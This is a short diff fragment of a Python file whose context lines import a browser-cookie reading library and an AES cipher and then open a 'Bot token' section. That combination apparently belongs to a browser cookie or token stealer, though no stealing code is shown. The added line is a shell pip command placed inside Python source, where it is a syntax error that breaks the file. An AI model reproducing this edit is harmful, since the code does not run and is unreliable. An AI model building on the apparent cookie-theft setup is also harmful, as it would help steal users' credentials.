@@ -31,6 +31,8 @@ import browser_cookie3
 from Cryptodome.Cipher import AES
 from colorama import Fore, init
 
+pip install --upgrade pip
+
 init()
 
 # Bot token
